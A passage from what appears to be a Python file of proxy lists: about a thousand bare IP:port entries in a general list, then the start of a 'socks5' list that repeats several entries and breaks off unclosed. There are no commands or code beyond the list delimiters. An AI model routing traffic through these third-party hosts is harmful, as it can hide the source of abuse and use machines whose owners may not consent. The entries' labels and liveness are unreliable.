177.229.197.94:999
177.234.217.82:999
177.234.217.85:999
177.234.217.86:999
177.234.236.12:999
177.240.27.141:999
177.242.151.131:8080
177.242.151.137:8080
177.242.151.148:8080
177.38.15.44:8080
177.53.153.14:999
177.53.153.16:999
177.53.153.29:999
177.54.229.1:9292
177.55.207.38:8080
177.55.64.130:8080
177.71.92.134:8080
177.74.226.26:4040
177.87.168.101:53281
177.93.110.17:8080
177.93.36.51:999
177.93.38.106:999
177.93.50.106:999
177.93.50.234:999
178.128.154.70:80
178.150.148.38:8282
178.151.205.154:45099
178.152.31.212:8080
178.159.126.93:8080
178.168.88.199:8080
178.200.32.186:8118
178.205.101.67:3129
178.212.54.137:8080
178.216.24.80:55443
178.236.223.250:8080
178.32.101.200:80
178.54.21.203:8081
179.0.176.3:3180
179.1.129.54:999
179.1.129.94:999
179.124.31.233:8080
179.27.158.78:80
179.43.96.178:8080
179.49.113.230:999
179.49.117.226:999
179.60.235.248:8097
179.60.235.250:8097
179.60.235.251:8096
179.60.240.69:53281
179.63.251.14:80
18.200.5.18:80
180.178.106.137:8080
180.180.123.40:8080
180.191.40.48:8080
180.193.213.42:8080
180.210.184.226:8080
180.211.158.122:58375
180.211.183.2:8080
180.211.248.222:8080
180.211.91.44:3125
180.250.252.220:8080
180.254.243.133:8080
180.92.145.234:8080
180.94.69.66:8080
180.94.75.162:8080
181.10.117.254:999
181.10.123.154:999
181.10.160.156:8080
181.114.226.55:8080
181.115.187.218:8080
181.115.67.3:999
181.119.64.186:999
181.129.183.19:53281
181.129.2.90:8081
181.129.49.214:999
181.129.52.156:42648
181.129.52.157:42648
181.129.98.146:8080
181.143.106.162:52151
181.143.37.90:8181
181.174.224.34:999
181.174.224.35:999
181.176.211.168:8080
181.192.2.23:8080
181.196.150.166:9898
181.205.124.34:999
181.209.105.155:8080
181.209.77.250:999
181.209.95.12:999
181.211.255.129:9898
181.212.120.130:999
181.212.41.171:999
181.225.101.14:999
181.232.190.131:999
181.232.190.227:999
181.36.121.222:999
181.48.101.245:3128
181.65.128.138:999
181.78.13.211:999
181.78.16.225:999
181.78.27.38:999
181.78.3.152:999
182.106.220.252:9091
182.16.171.42:43188
182.176.164.41:8080
182.18.179.129:83
182.23.57.139:8080
182.253.102.234:8080
182.253.105.123:8080
182.253.108.186:8080
182.253.108.50:40448
182.253.108.51:40448
182.253.115.26:1000
182.253.140.250:8080
182.253.159.74:8080
182.253.181.10:8080
182.253.189.244:8080
182.253.233.188:8080
182.253.28.124:8080
182.253.45.119:8080
182.53.50.2:3128
182.61.201.201:80
182.74.63.189:83
182.90.224.115:3128
183.129.190.172:9091
183.165.248.97:8089
183.220.6.198:9091
183.221.221.149:9091
183.233.169.226:9091
183.236.232.160:8080
183.237.45.34:9091
183.237.47.54:9091
183.239.38.216:9091
183.247.202.208:30001
183.247.221.119:30001
183.249.7.226:9091
183.251.152.214:9091
183.27.250.138:8085
183.88.173.179:8080
183.88.228.208:8080
183.89.10.89:8080
183.89.184.110:8080
185.103.181.84:8080
185.125.125.157:80
185.125.253.129:8080
185.134.49.179:3128
185.142.43.217:8080
185.15.172.212:3128
185.17.132.15:2536
185.19.4.22:3128
185.190.38.150:8080
185.190.38.22:8080
185.202.113.112:3128
185.211.6.165:10000
185.213.210.62:5577
185.245.182.5:80
185.251.12.25:8080
185.255.46.121:8080
185.49.96.94:8080
185.58.17.129:8080
185.61.152.137:8080
185.82.99.148:8099
185.86.162.107:3111
185.86.162.12:3111
185.93.71.159:33128
186.10.252.90:999
186.119.118.42:8082
186.119.118.45:8082
186.125.235.101:999
186.150.207.2:8080
186.194.160.121:999
186.211.177.161:8082
186.215.87.194:50038
186.232.119.58:3128
186.250.29.225:8080
186.3.155.25:8080
186.3.48.210:999
186.47.83.126:80
186.5.94.202:999
186.68.101.146:6969
186.97.172.178:60080
187.1.175.50:8080
187.1.57.206:20183
187.102.216.161:999
187.102.216.1:999
187.102.217.6:999
187.102.219.138:999
187.102.236.177:999
187.102.236.209:999
187.115.10.50:20183
187.188.143.100:999
187.188.169.169:8080
187.188.17.138:1994
187.189.175.136:999
187.190.0.240:999
187.200.52.188:999
187.216.90.46:53281
187.32.147.196:80
187.33.231.71:8080
187.60.46.112:80
187.60.46.113:80
187.60.46.114:80
187.60.46.115:80
187.60.46.116:80
187.60.46.117:80
187.60.46.119:80
187.62.195.145:8080
187.62.64.153:45005
187.94.16.59:39665
187.95.112.36:6666
188.132.222.3:8080
188.132.222.9:8080
188.133.136.116:8090
188.133.157.61:10000
188.133.158.27:8080
188.133.159.119:10000
188.133.173.21:8080
188.163.170.130:41209
188.169.38.111:8080
188.235.0.207:8282
188.34.140.205:8080
188.43.228.25:8080
188.82.97.82:80
188.94.225.5:8080
188.94.231.69:8080
189.129.109.155:999
189.150.19.121:999
189.173.165.71:999
189.193.224.222:999
189.201.191.9:999
189.203.10.141:999
189.203.234.146:999
189.248.169.190:999
189.251.31.119:999
189.91.98.186:8080
190.104.5.173:8080
190.109.16.145:999
190.109.168.217:8080
190.109.23.170:999
190.109.64.231:8080
190.112.137.81:8085
190.113.41.83:999
190.120.186.30:999
190.121.128.217:999
190.121.153.93:999
190.121.157.142:999
190.128.165.178:8080
190.14.238.187:999
190.145.150.30:999
190.146.1.148:999
190.152.5.126:53040
190.185.116.161:999
190.186.1.126:999
190.186.1.177:999
190.186.18.177:999
190.2.210.115:999
190.2.213.35:6969
190.210.194.136:8080
190.214.27.46:8080
190.217.10.12:999
190.217.101.73:999
190.220.1.173:56974
190.56.123.218:999
190.56.14.34:8080
190.61.101.205:8080
190.61.57.45:8080
190.61.61.70:8080
190.61.84.166:9812
190.8.38.83:999
190.8.39.59:999
190.89.37.75:999
190.90.154.195:999
190.94.244.90:8080
191.102.107.235:999
191.102.73.108:999
191.103.219.225:48612
191.110.84.156:999
191.52.213.9:999
191.97.1.89:999
191.97.14.26:999
191.97.18.177:999
191.97.19.158:999
191.97.19.49:999
191.97.19.57:999
192.140.42.83:31511
192.158.15.201:60684
192.169.255.208:80
192.169.88.83:80
192.53.163.144:3128
192.53.163.144:8080
192.99.182.243:3128
193.106.109.195:80
193.122.71.184:3128
193.138.178.6:8282
193.164.131.202:7890
193.168.153.175:3128
193.29.53.26:3128
193.3.52.5:8080
194.145.138.14:9090
194.145.138.84:9090
194.169.167.5:8080
194.195.216.153:4145
194.195.216.153:4153
194.233.84.239:80
194.233.87.16:3128
194.44.93.102:3128
195.133.49.95:3128
195.178.56.35:8080
195.210.169.82:8080
195.211.219.147:5555
195.250.92.58:8080
195.3.246.209:3128
195.39.233.18:8080
195.62.17.198:8081
195.8.52.243:8080
196.0.111.194:34638
196.2.15.68:8080
196.202.162.74:8080
196.216.135.116:8082
196.216.215.117:56975
196.216.215.11:56975
196.216.65.57:8080
196.219.202.74:8080
196.251.222.154:8080
196.251.222.229:8080
196.44.117.50:8080
197.134.250.199:8080
197.155.73.84:8081
197.210.130.54:41890
197.211.35.195:8080
197.232.36.85:41890
197.232.65.40:55443
197.245.230.122:41026
197.251.233.124:8080
197.97.76.220:8080
198.11.175.180:8080
198.11.175.192:8080
198.49.68.80:80
198.59.191.234:8080
198.69.13.254:9090
198.74.56.87:3128
198.74.56.87:8080
2.184.4.68:6565
2.207.137.41:80
20.111.54.16:80
20.111.54.16:8123
20.119.41.154:3128
20.206.106.192:80
20.206.106.192:8123
20.210.113.32:80
20.210.113.32:8123
20.210.90.96:3128
20.212.168.206:80
20.237.62.100:8080
20.24.43.214:8123
20.243.24.157:80
20.25.84.98:9090
20.54.56.26:8080
20.72.145.13:8080
20.81.62.32:3128
200.105.215.18:33630
200.106.124.129:999
200.106.167.114:999
200.106.187.242:999
200.111.182.6:443
200.116.198.177:35184
200.119.218.89:999
200.12.45.179:999
200.12.56.19:999
200.125.168.132:999
200.125.171.60:999
200.125.171.61:999
200.155.136.78:8080
200.155.142.96:8080
200.170.175.132:8081
200.202.223.46:8080
200.25.254.157:8080
200.25.254.193:54240
200.252.32.40:53281
200.32.51.179:8080
200.32.80.54:999
200.37.140.36:10101
200.39.153.1:999
200.48.3.227:10101
200.55.255.242:8083
200.6.185.62:6969
200.6.190.148:999
200.60.119.131:999
200.60.87.202:999
200.61.16.80:8080
200.7.10.158:8080
200.71.109.226:999
200.71.109.236:999
200.71.115.3:8081
200.76.55.90:999
201.158.44.163:4343
201.163.163.202:999
201.174.104.222:999
201.184.107.27:999
201.20.110.54:55443
201.217.246.178:8080
201.217.55.97:8080
201.219.11.202:999
201.219.194.189:999
201.220.102.146:8080
201.221.187.209:999
201.222.45.64:999
201.222.45.65:999
201.229.250.22:8080
201.249.152.174:999
201.71.159.8:5566
201.71.2.120:999
201.71.2.41:999
201.77.108.130:999
201.91.18.82:8000
201.91.82.155:3128
202.0.103.115:80
202.131.159.194:80
202.131.159.218:80
202.131.159.222:80
202.131.159.226:80
202.131.159.230:80
202.137.15.253:3888
202.142.158.114:8080
202.145.8.131:3125
202.152.135.162:8080
202.153.233.228:8080
202.154.180.53:46717
202.154.191.38:8080
202.158.76.142:2121
202.164.39.147:3128
202.168.69.226:8080
202.169.229.139:53281
202.180.16.1:8080
202.180.17.131:8080
202.180.20.11:55443
202.180.20.66:8080
202.180.54.210:8080
202.180.54.97:8080
202.212.212.250:80
202.40.188.92:40486
202.43.147.167:6666
202.52.13.2:8089
202.53.171.114:8080
202.57.2.19:8080
202.59.164.59:8080
202.6.227.174:3888
202.65.158.235:82
202.77.115.66:8182
202.77.120.38:57965
202.8.74.10:8080
202.91.86.230:8080
202.91.91.51:3128
203.10.96.62:3128
203.112.223.126:8080
203.128.75.196:8080
203.144.144.146:8080
203.147.90.140:8080
203.150.128.211:8080
203.150.128.81:8080
203.160.174.82:8091
203.170.222.4:8080
203.189.137.96:8080
203.189.142.168:53281
203.190.117.206:80
203.190.44.10:3127
203.192.217.11:8080
203.202.255.67:8080
203.210.85.105:3128
203.210.85.105:8080
203.243.63.16:80
203.77.231.90:9812
203.78.146.70:80
203.81.70.110:8080
203.86.29.138:80
203.89.126.250:80
204.137.174.250:999
204.185.204.64:8080
204.199.120.158:999
204.199.172.118:999
204.83.205.117:3128
206.189.41.138:3123
206.43.196.28:55443
206.43.196.29:55443
206.62.137.57:8080
206.84.104.126:3128
207.180.252.117:2222
207.45.217.243:8000
208.109.191.161:80
208.163.39.218:53281
208.180.105.70:8080
209.141.62.12:5555
209.37.250.19:80
209.97.134.22:3128
209.97.152.208:8888
210.245.54.97:8080
210.5.10.87:53281
211.138.173.110:9091
211.143.243.26:9091
211.248.241.66:3128
211.43.214.205:80
212.126.106.230:8889
212.126.96.154:8080
212.154.82.52:9090
212.46.230.102:6969
212.73.73.234:8081
212.92.204.54:8080
212.95.180.50:53281
213.149.182.98:8080
213.151.79.84:8080
213.165.168.190:9898
213.179.245.72:8181
213.212.247.204:1976
213.230.108.161:8080
213.232.235.36:3128
213.242.252.137:3128
213.251.238.26:8080
213.5.190.194:41890
216.137.184.253:80
216.155.89.66:999
216.169.73.65:34679
216.176.187.99:30003
216.176.187.99:30022
216.176.187.99:30036
216.176.187.99:8886
216.254.142.34:80
217.10.45.62:8081
217.11.184.27:3128
217.117.15.98:8080
217.28.220.234:80
217.66.200.154:3128
217.67.190.154:3128
218.203.68.12:9091
218.207.72.202:3128
218.252.244.104:80
218.28.98.229:9091
218.7.171.91:3128
218.75.38.154:9091
219.77.188.21:80
219.78.194.41:80
219.78.228.211:80
220.195.3.99:808
220.247.171.242:8080
220.87.121.155:80
221.120.210.211:39617
221.131.141.243:9091
221.132.18.26:8090
221.176.216.226:9091
221.178.176.25:3128
221.2.139.220:9091
221.217.50.66:9000
221.223.25.67:9000
221.226.75.86:55443
221.5.80.66:3128
221.6.201.74:9999
222.124.176.147:8080
222.124.219.42:8080
222.129.139.161:9000
222.138.64.93:9091
222.139.221.185:9091
222.175.22.197:9091
222.180.240.62:9091
222.216.37.138:808
222.253.48.253:8080
222.67.188.68:9000
222.99.52.67:3128
223.100.178.167:9091
223.113.80.158:9091
223.68.190.136:9091
223.82.60.202:8060
223.84.240.36:9091
223.85.12.16:2222
223.96.90.216:8085
223.96.94.87:9091
23.229.21.138:3128
23.92.29.132:8080
24.106.221.230:53281
24.116.218.195:8080
24.152.49.226:999
24.172.34.114:49920
24.172.82.94:53281
24.227.247.186:8080
24.72.171.214:8080
27.111.45.27:55443
27.111.45.29:55443
27.124.24.212:80
27.131.179.207:10443
27.184.53.60:8089
27.195.156.90:9091
27.72.149.205:8080
3.1.248.232:80
31.128.130.9:8080
31.129.163.70:78
31.129.166.5:8080
31.14.128.43:8888
31.14.128.45:8888
31.145.154.138:9093
31.223.19.162:8081
31.46.33.59:53281
35.201.247.214:80
36.137.233.44:8081
36.138.221.55:8081
36.6.158.202:8089
36.66.19.10:8080
36.66.83.103:8080
36.67.186.76:8080
36.67.49.196:9999
36.89.156.146:8080
36.89.214.20:4480
36.89.214.21:4480
36.89.252.155:8080
36.89.66.164:8080
36.90.1.155:8080
36.91.108.142:3128
36.91.166.98:8080
36.91.68.149:8080
36.91.88.166:8080
36.91.98.115:8181
36.92.111.49:9812
36.93.2.50:8080
36.93.30.197:8080
36.93.83.25:8080
36.94.142.165:8080
36.94.174.243:8080
36.94.2.138:443
36.94.47.62:4480
36.94.54.93:8080
36.94.8.23:8080
36.95.114.36:8080
36.95.116.9:9812
36.95.17.93:9812
36.95.173.178:8080
36.95.177.177:8080
36.95.238.251:8080
36.95.249.157:8080
36.95.27.209:80
36.95.27.225:8080
36.95.75.3:8080
36.95.79.7:41890
36.95.84.151:41890
37.112.210.121:55443
37.148.217.234:999
37.148.217.235:999
37.18.73.87:5566
37.204.157.91:41890
37.228.65.107:32052
37.230.114.132:3128
37.235.20.148:8080
37.235.24.194:3128
37.236.59.107:80
37.236.59.107:8080
37.236.60.35:80
37.236.60.35:8080
37.238.132.158:54190
37.252.73.193:8080
37.252.73.196:8080
37.26.86.206:47464
37.32.22.14:8118
37.44.244.35:3129
38.10.247.42:999
38.10.68.234:9090
38.242.204.153:7070
38.41.0.193:8080
38.41.0.88:999
38.41.29.78:8080
38.41.53.145:9090
38.49.131.176:999
38.65.136.137:999
38.7.16.188:999
38.94.109.12:80
39.175.82.253:30001
39.175.92.35:30001
39.185.232.150:9091
40.136.41.9:8080
41.128.148.78:1976
41.128.148.78:1981
41.130.229.137:8080
41.174.132.58:8080
41.186.44.106:3128
41.188.149.79:80
41.203.83.242:8080
41.204.87.90:8080
41.220.238.130:83
41.220.238.137:83
41.242.116.150:50000
41.254.53.70:1976
41.33.3.36:1981
41.33.3.40:1981
41.57.138.30:8080
41.57.16.1:8080
41.57.48.1:8080
41.58.144.126:9812
41.65.0.219:1976
41.65.0.219:1981
41.65.160.170:1981
41.65.162.75:1981
41.65.168.58:1976
41.65.174.120:1976
41.65.174.120:1981
41.65.227.172:1981
41.65.236.35:1981
41.65.236.37:1976
41.65.236.37:1981
41.65.236.41:1981
41.65.236.43:1981
41.65.236.48:1976
41.65.236.48:1981
41.65.236.56:1976
41.65.236.56:1981
41.65.236.57:1981
41.65.236.58:1981
41.65.251.85:1976
41.65.252.105:1981
41.65.55.2:1981
41.73.158.154:8080
41.75.85.22:8080
41.77.129.154:53281
42.228.61.245:9091
42.3.182.149:80
43.154.216.109:80
43.155.75.29:24014
43.225.185.154:8080
43.230.123.14:80
43.242.135.182:80
43.242.135.182:8080
43.243.140.198:8080
43.243.174.3:83
43.245.95.178:53805
43.245.95.210:53805
43.249.140.230:8080
43.254.126.41:8080
43.255.113.232:80
43.255.113.232:8080
43.255.113.232:8081
43.255.113.232:8082
43.255.113.232:8083
43.255.113.232:8084
43.255.113.232:8085
43.255.113.232:8086
43.255.113.232:81
43.255.113.232:82
43.255.113.232:83
43.255.113.232:84
43.255.113.232:86
44.193.229.111:80
44.235.134.220:80
45.112.127.140:3179
45.112.28.161:81
45.116.229.183:8080
45.116.230.79:8080
45.119.9.158:808
45.120.216.98:12345
45.120.39.68:80
45.121.216.219:55443
45.124.12.10:80
45.124.56.254:3128
45.126.21.75:8085
45.149.43.56:53281
45.149.77.173:3128
45.153.185.174:80
45.156.24.36:7777
45.160.168.187:8080
45.160.78.113:999
45.160.78.9:999
45.161.33.129:8081
45.164.150.122:999
45.164.64.69:8084
45.165.131.46:8080
45.167.23.30:999
45.167.23.31:999
45.167.90.61:999
45.167.95.184:8085
45.169.136.183:3128
45.169.162.1:3128
45.170.35.57:999
45.170.43.1:999
45.171.109.1:999
45.172.111.125:999
45.172.111.91:999
45.172.17.150:8080
45.173.6.58:999
45.173.6.5:999
45.173.6.98:999
45.174.168.2:999
45.174.168.4:999
45.174.168.5:999
45.174.168.6:999
45.174.70.18:53281
45.174.77.1:999
45.174.78.64:999
45.175.236.64:999
45.175.237.35:999
45.175.239.126:999
45.175.239.17:999
45.175.239.5:999
45.175.255.4:999
45.179.184.6:8083
45.179.193.144:999
45.179.193.163:999
45.181.122.169:999
45.181.122.74:999
45.182.141.195:999
45.184.129.165:8181
45.184.73.114:40033
45.186.60.6:8085
45.189.113.63:999
45.189.252.130:999
45.189.255.18:999
45.189.58.70:9090
45.190.13.178:999
45.190.170.254:999
45.190.79.160:999
45.190.79.164:999
45.224.119.16:999
45.224.148.74:999
45.224.149.246:999
45.225.184.145:999
45.225.184.177:999
45.228.235.26:999
45.229.34.174:999
45.229.6.41:999
45.229.6.42:999
45.230.172.182:8080
45.231.168.93:999
45.231.220.71:999
45.233.245.85:8083
45.233.67.207:999
45.233.67.208:999
45.233.67.211:999
45.233.67.233:999
45.234.60.252:999
45.236.31.160:999
45.250.215.8:8080
45.250.37.132:3128
45.251.74.228:80
45.32.101.24:80
45.33.12.251:8080
45.33.121.249:8080
45.5.119.178:8080
45.5.145.164:8090
45.56.98.229:3128
45.56.98.229:4985
45.56.98.229:49857
45.64.11.233:8080
45.7.177.204:34234
45.70.14.33:999
45.70.15.2:8080
45.70.15.3:8080
45.70.15.4:8080
45.70.15.5:8080
45.70.15.6:8080
45.70.15.7:8080
45.70.15.9:8080
45.70.236.123:999
45.70.236.125:999
45.71.113.97:999
45.71.184.239:999
45.71.197.1:999
45.79.158.235:1080
45.79.158.235:44554
45.79.208.64:3128
45.79.208.64:4455
45.79.208.64:44554
45.79.27.210:1080
45.79.27.210:3128
45.79.27.210:4455
45.79.27.210:44554
45.79.27.210:999
45.79.34.127:3128
45.79.94.19:80
45.94.209.80:3128
46.1.103.186:10001
46.101.13.77:80
46.122.7.149:8080
46.161.194.71:8080
46.163.124.109:80
46.163.74.99:3128
46.17.106.69:8080
46.173.104.245:8080
46.191.163.5:8080
46.209.196.146:8080
46.225.237.146:3128
46.249.123.165:6565
46.38.44.81:8082
46.52.130.52:8080
47.180.214.9:3128
47.241.165.133:443
47.241.245.186:80
47.243.175.55:8080
47.243.242.70:8080
47.243.244.2:80
47.243.50.83:8080
47.245.34.161:8080
47.250.37.136:8080
47.250.39.134:8080
47.252.1.180:3128
47.252.1.180:8080
47.252.20.42:8080
47.252.4.64:8888
47.253.105.175:5566
47.253.105.175:9999
47.253.71.33:9999
47.254.153.78:8080
47.254.158.115:8080
47.254.237.222:8080
47.254.239.51:8080
47.254.47.61:8080
47.254.90.125:3128
47.254.90.125:80
47.254.90.125:8008
47.57.188.208:80
47.74.152.29:8888
47.74.64.65:8080
47.74.71.208:8080
47.88.11.3:8080
47.88.29.108:8080
47.89.153.213:80
47.89.185.178:8888
47.91.104.110:8080
47.91.104.193:8080
47.91.107.139:8080
47.91.125.239:8080
47.91.126.36:8080
47.91.45.198:8080
47.91.45.235:8080
47.91.56.120:8080
47.91.95.174:8080
49.0.200.210:8080
49.0.250.196:8080
49.0.252.39:8080
49.0.253.51:8080
49.0.32.2:8080
49.156.42.188:8080
49.207.36.81:80
49.231.11.82:8080
49.231.140.120:8080
49.48.51.125:8080
49.72.46.211:3128
5.158.126.16:3128
5.16.0.18:8080
5.161.49.165:80
5.161.66.10:3128
5.161.81.198:3128
5.182.26.131:80
5.189.166.169:22
5.189.184.6:80
5.202.191.225:8080
5.44.54.16:8080
5.44.60.133:8080
5.58.110.249:8080
5.58.58.209:8080
5.58.97.89:8080
5.59.145.129:8080
50.199.32.226:8080
50.233.228.147:8080
50.246.120.125:8080
50.62.170.198:80
51.103.137.65:80
51.13.167.139:80
51.15.228.227:3128
51.158.112.32:3128
51.158.188.199:8118
51.159.162.151:80
51.159.207.156:3128
51.222.114.109:3128
51.222.158.127:80
51.38.95.28:3128
51.68.124.241:80
51.75.206.209:80
51.77.141.29:1081
51.79.152.70:3128
51.79.228.172:3128
51.79.50.22:9300
51.79.50.31:9300
51.79.50.46:9300
51.79.84.162:12990
51.79.87.150:12916
51.79.87.150:12931
51.79.87.150:13187
51.91.56.181:3128
52.168.14.234:80
52.226.135.84:80
52.233.192.133:80
54.210.239.35:80
54.238.56.216:8080
54.86.198.153:80
58.17.24.162:9091
58.20.184.187:9091
58.222.193.162:2222
58.246.58.150:9002
58.27.59.249:80
58.35.61.28:8090
58.39.62.145:9797
58.82.151.242:8080
59.11.153.88:80
59.46.32.68:8118
59.48.94.90:9091
60.167.133.69:8888
60.169.97.44:8089
60.171.15.17:20000
60.209.97.182:9999
60.211.218.78:53281
60.214.128.150:9091
60.251.183.62:80
61.164.39.67:53281
61.19.109.236:8080
61.19.145.66:8080
61.216.185.88:60808
61.29.96.146:80
61.7.146.7:80
61.79.139.30:80
61.9.34.46:1337
61.9.53.157:1337
62.122.201.105:8080
62.176.12.111:8080
62.193.108.134:1976
62.193.108.134:1981
62.193.108.142:1976
62.193.108.142:1981
62.193.108.144:1976
62.193.108.144:1981
62.193.108.146:1981
62.201.214.146:8080
62.201.217.194:8080
62.205.169.74:53281
62.27.108.174:8080
62.3.30.26:8080
63.151.67.7:8080
63.239.220.5:8080
63.250.53.181:3128
64.119.29.22:8080
64.224.255.173:8080
65.108.88.4:3128
65.20.192.167:8080
66.94.113.79:3128
66.96.241.162:3125
67.206.232.1:999
67.206.232.49:999
67.52.175.140:8080
67.55.186.162:8080
68.183.185.62:80
68.183.230.116:39503
68.183.242.248:3128
69.11.145.106:8080
69.160.192.139:8080
69.160.7.126:8080
69.92.239.218:8080
70.177.15.10:8080
70.90.138.109:8080
71.14.214.67:8080
71.14.23.121:8080
71.25.47.187:8080
72.14.191.144:8080
72.169.65.13:87
72.169.67.101:87
72.170.220.17:8080
72.46.141.86:8080
72.55.155.80:80
74.205.128.200:80
75.106.98.189:8080
77.20.43.24:8118
77.225.198.220:9812
77.235.2.4:3128
77.236.237.241:1256
77.236.243.39:1256
77.236.248.237:8080
77.237.91.214:3128
77.238.109.210:80
77.238.79.111:8080
77.39.127.61:80
77.46.113.11:8080
77.51.204.218:8080
77.68.117.95:3128
78.157.42.105:80
78.157.42.106:80
78.186.85.127:10001
78.188.118.100:10001
78.189.32.215:8080
78.38.224.102:8080
78.84.14.122:53281
79.101.55.161:53281
79.122.202.20:8080
79.140.17.172:8016
79.142.95.90:55443
79.143.187.33:3210
8.141.251.188:3128
8.208.84.236:8080
8.208.85.34:8080
8.208.89.32:8080
8.208.90.194:8080
8.209.240.66:8080
8.209.243.173:8080
8.209.246.6:80
8.209.249.96:8080
8.209.253.237:8080
8.209.64.208:8080
8.209.68.1:8080
8.210.149.174:80
8.210.37.63:8080
8.210.83.33:80
8.213.128.6:8080
8.213.128.90:8080
8.213.129.15:8080
8.213.137.155:8080
8.214.4.72:33080
8.218.213.95:10809
8.219.167.110:8080
8.219.169.172:8080
8.219.43.134:8080
8.219.5.240:8080
8.242.171.162:8080
8.242.178.122:999
8.242.190.119:999
8.242.205.41:9991
80.179.140.189:80
80.210.63.249:8080
80.240.202.218:8080
80.244.226.92:8080
80.252.5.34:7001
80.78.237.2:55443
80.87.213.111:8080
80.87.213.45:8080
80.87.217.6:8080
80.88.88.186:8888
81.162.67.86:8080
81.200.123.74:80
81.94.255.12:8080
81.95.232.73:3128
82.114.97.157:1256
82.115.16.187:3128
82.137.244.74:8080
82.146.40.196:8888
82.147.118.164:8080
82.165.105.48:80
82.165.147.146:80
82.200.237.10:8080
82.200.80.118:8080
82.204.150.190:3129
82.210.8.173:80
82.223.102.92:9443
82.66.196.208:80
83.169.44.234:80
83.174.218.83:8080
84.204.40.154:8080
84.204.40.156:8080
84.214.150.146:8080
85.117.56.147:8080
85.14.112.37:8090
85.159.2.171:8080
85.159.6.20:8080
85.173.165.36:46330
85.195.104.71:80
85.198.142.186:8081
85.214.139.192:7080
85.235.184.186:3129
85.25.111.162:5566
85.25.91.141:32841
85.62.10.83:8080
85.62.10.94:8080
87.245.209.76:8080
87.249.9.193:8082
88.135.210.179:8080
88.248.104.37:34034
88.255.101.237:8080
88.255.102.32:8080
88.87.89.180:8181
89.104.102.96:8080
89.107.197.165:3128
89.109.11.79:3128
89.111.105.72:41258
89.146.224.183:80
89.207.129.100:3128
89.208.35.81:3128
89.22.102.73:80
89.35.143.109:3128
89.38.96.219:3128
91.108.132.142:8080
91.144.176.2:8080
91.197.77.118:443
91.204.239.189:8080
91.205.196.190:8080
91.211.245.202:3128
91.215.79.95:8081
91.221.240.20:1515
91.233.169.23:8081
91.238.52.18:7777
91.90.180.185:8080
91.93.42.117:10001
91.93.42.118:10001
92.205.22.114:38080
92.244.66.236:80
92.249.122.108:61778
92.80.1.202:8082
93.100.118.135:8080
93.105.40.62:41258
93.115.146.48:8080
93.145.17.218:8080
93.157.163.66:35081
93.177.229.164:9812
93.73.9.162:18613
94.101.177.5:443
94.102.194.1:1500
94.102.196.89:1500
94.103.85.88:9300
94.127.219.99:8080
94.137.235.210:8080
94.181.48.110:1256
94.21.51.230:8080
94.23.91.209:80
94.242.55.10:80
94.247.244.120:3128
94.28.32.117:8080
94.28.32.54:8080
95.0.84.26:80
95.137.240.30:60030
95.17.166.205:8118
95.171.5.144:1256
95.216.194.46:1081
95.217.190.230:80
95.217.84.58:8118
95.31.5.29:54651
95.37.48.99:8080
96.232.166.51:80
96.36.109.242:8080
97.76.251.138:8080
"""
]

socks5 = [
"""167.235.135.110:80
51.159.162.151:80
83.229.73.175:80
23.238.33.186:80
101.68.58.135:8085
47.95.254.71:80
104.248.63.17:30588
104.248.63.18:30588
136.244.111.12:3128
159.89.49.60:31264
162.243.175.93:1080
167.86.67.67:9050
104.248.63.17:30588
104.248.63.18:30588
136.244.111.12:3128
159.89.49.60:31264
162.243.175.93:1080
167.86.67.67:9050
167.86.67.67:9050
104.248.63.17:30588
104.248.63.49:30588
159.89.49.60:31264
104.236.26.27:38801
104.248.63.15:30588
104.248.63.15:30588
104.248.63.17:30588
104.248.63.15:30588
104.248.63.18:30588
104.248.63.49:30588
173.244.200.155:51527
104.248.63.15:30588
104.248.63.17:30588
104.248.63.17:30588
104.248.63.17:30588
54.213.25.122:45678
104.236.26.27:38801
104.248.63.15:30588
104.248.63.18:30588
104.248.63.18:30588
104.248.63.49:30588
206.81.2.118:1080
207.97.174.134:1080
51.81.31.169:44857
51.81.31.169:44857
51.81.31.61:21401
104.223.200.152:1080
104.236.26.27:38801
206.81.2.118:1080
207.97.174.134:1080
104.248.63.15:30588
104.248.63.17:30588
104.248.63.17:30588
104.248.63.18:30588
104.248.63.18:30588
104.248.63.49:30588
104.248.63.15:30588
104.248.63.15:30588
104.248.63.17:30588
104.248.63.18:30588
104.248.63.18:30588
104.248.63.49:30588
104.248.63.17:30588
104.248.63.49:30588
159.89.49.60:31264
162.243.175.93:1080
206.81.2.118:1080
104.248.63.18:30588
162.243.175.93:1080
104.248.63.15:30588
104.248.63.17:30588
104.248.63.18:30588
104.248.63.18:30588
159.89.49.60:31264
174.70.241.14:24392
174.70.241.8:24398
74.91.23.212:1080
96.44.133.110:58690
104.248.63.15:30588
104.248.63.17:30588
104.248.63.17:30588
104.248.63.18:30588
104.248.63.49:30588
104.248.63.17:30588
104.248.63.17:30588
207.97.174.134:1080
216.144.228.130:15378
216.144.230.233:15993
34.84.57.254:22080
67.213.212.12:30290
104.248.63.17:30588
104.248.63.18:30588
104.248.63.49:30588
159.89.49.60:31264
174.70.241.18:24404
174.70.241.8:24398
18.188.26.129:9050
104.248.63.17:30588
104.248.63.49:30588
51.81.31.170:32716
67.213.212.15:29830
67.213.212.15:29830
104.248.63.17:30588
104.248.63.18:30588
1.0.133.100:51327
1.0.170.50:80
1.1.189.58:8080
1.10.189.133:50855
1.179.130.201:4153
1.179.136.98:8080
1.179.144.41:8080
1.179.148.9:36476
1.179.148.9:55636
1.179.220.207:7497
1.186.40.2:39651
1.2.252.65:8080
1.20.169.88:4153
1.20.95.95:5678
1.220.145.45:4145
1.224.3.122:3888
1.255.134.136:3128
1.36.76.102:80
1.36.76.10:80
1.36.76.168:80
1.36.76.220:80
1.57.21.59:7302
101.109.245.200:4153
101.109.251.42:4145
101.109.41.137:4153
101.200.127.149:3129
101.51.104.95:4145
101.51.55.153:8080
101.74.239.6:1111
102.128.131.72:1080
102.165.242.129:5678
102.219.33.110:1080
102.219.33.129:1080
102.222.146.203:8080
102.222.252.6:9050
102.68.17.196:5678
103.104.177.195:16454
103.104.177.195:29020
103.105.78.205:8080
103.106.112.11:5430
103.106.193.137:7532
103.109.196.49:5678
103.109.24.116:5678
103.110.162.210:80
103.110.84.199:7497
103.111.82.82:9812
103.115.255.161:36331
103.116.202.241:5678
103.117.192.14:80
103.117.192.174:80
103.120.135.229:33427
103.120.192.17:6969
103.121.62.137:5678
103.123.234.106:8080
103.124.197.78:1080
103.127.1.130:80
103.127.59.125:5678
103.130.106.209:83
103.132.92.114:5678
103.133.37.77:4153
103.134.214.130:1648
103.134.239.210:5678
103.137.8.98:4153
103.142.21.197:8080
103.144.255.146:5678
103.145.128.179:8088
103.145.133.22:42325
